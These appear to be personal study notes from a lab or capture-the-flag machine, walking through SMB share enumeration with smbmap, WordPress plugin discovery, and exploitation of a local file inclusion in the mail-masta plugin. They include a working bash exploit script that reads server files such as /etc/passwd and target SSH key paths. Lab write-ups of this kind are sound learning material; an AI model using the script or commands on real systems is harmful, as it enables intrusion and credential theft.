![[Pasted image 20240321172749.png]]![[Pasted image 20240321173751.png]]
![[Pasted image 20240321173808.png]]
## SMB Exploitation
[[SMB - Samba- Network Shares y Null Session]]
![[Pasted image 20240321174038.png]]we found anonymous file:
$smbmap -H 192.168.195.54 -r anonymous *list the file from user anonymous*
$smbmap -H 192.168.195.54 --download anonymous/attention.txt *dowload a file*
![[Pasted image 20240321180653.png]]

### User enumeration
Trying with users found in smbmap: Helios
`$smbmap -H 192.168.195.54 -u helios -p qwerty`
![[Pasted image 20240321191157.png]]
`$smbmap -H 192.168.195.54 -u helios -p qwerty -r helios` *verify what we found on disk helios*

`$smbmap -H 192.168.195.54 -u helios -p qwerty --download helios/todo.txt`

## Wordpress
[[WordPress Exploitation]]
As resources are not well gotten, inspecting the source code, it's using a domain name not recognized for our machine
![[Pasted image 20240321191830.png]]
![[Pasted image 20240321191950.png]]

We modidy /etc/hosts with the IP and domain. Now it works better:
![[Pasted image 20240321192150.png]]


#### Plugin enumeration
![[Pasted image 20240322040547.png]]
`$curl -s -X GET "http://192.168.195.54/h3l105/" | grep "wp-content" | grep -oP "'.*?'" | grep "symfonos.local" | cu -d '/' -f 1-7 | sort -u | grep plugins`
- *`grep -oP "'.*'"`* - `.`: Matches any character.
	- `*`: Indicates that the preceding character (here, the dot) can appear zero or more times.
	-  `?`: Makes the preceding quantifier non-greedy, meaning the pattern will match the smallest number of characters possible while still satisfying the condition. In other words, it enables non-greedy matching rather than greedy matching, which is important when using `grep -o` to get non-overlapping matches.
-  `cut -d '/' -f 1-7`: This sends the output of the previous command to `cut`, which splits each line using the delimiter '/' and displays fields 1 through 7.
- `sort -u`: sort unique
![[Pasted image 20240322044942.png]]

We found a service mail-masa which probably uses port 25 open.
![[Pasted image 20240322045038.png]]
### Local File exclusion
[[File Inclusion]]
Anlayzing the first exploit:
$searchsploit -x php/webapps/4290.txt
![[Pasted image 20240322045336.png]]
We can use the prof of concept
![[Pasted image 20240322045605.png]]


#### Scrip to get 
#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "\n\n${redColour} [!] Quitting...${endColour} \n"
  exit 1
}

#Ctrl+C
trap ctrl_c INT

declare -i parameter_counter=0

function fileRead(){
  filename=$1

  echo -e "\n${yellowColour}[+]${endColour}${grayColour} Ceci est le contenu du fichier ${endColour}${redColour}$filename${endColour}${grayColour}:${endColour}\n"
  curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=$filename"
}

function helpPanel(){
  echo -e "\n${yellowColour}[i]${endColour}${grayColour}Usage:${endColour}\n"
  echo -e "\t${redColour}h)${endColour}${blueColour} Montrer panneau d'aide${endColour}" 
  echo -e "\t${redColour}f)${endColour}${blueColour} Donner le chemin du fichier"
}
while getopts "hf:" arg; do
  case $arg in
    h);;
    f) filename=$OPTARG; let parameter_counter+=1;;
  esac
done

if [ $parameter_counter -eq 1 ]; then
  fileRead "$filename"
else
  helpPanel
fi



- `getopts`: This is a built-in shell command that is used to parse command-line options and arguments. It is typically followed by a string containing the option characters that the script expects to receive. In this case, `"hf:"` specifies that the script expects two options: `-h` and `-f`, with the `-f` option requiring an argument (indicated by the colon `:` after the `f`).
    
- `"hf:"`: This string specifies the options that the script expects. Each letter corresponds to an option that the script can handle. If a letter is followed by a colon (`:`), it indicates that the option requires an argument.
    
- `arg`: This is the name of a variable that `getopts` uses to store each option it parses.
    
- `do`: This keyword begins a block of code that will be executed for each option parsed by `getopts`

We trying ennumerating users who has bash enabled.

`./lfi_read_file.sh -f /etc/passwd | grep "sh$"` *we can verify as well if there is a private key stored to get access without granting a password in path: /home/helios/.ssh/id_rsa*

![[Pasted image 20240322123535.png]]

`./lfi_read_file.sh -f /proc/schedstat

`/proc/schedstat` is a pseudo-file provided by the Linux kernel that contains scheduler statistics. The Linux scheduler is responsible for determining which processes should run, for how long, and in what order on a system with multiple processes competing for CPU time.

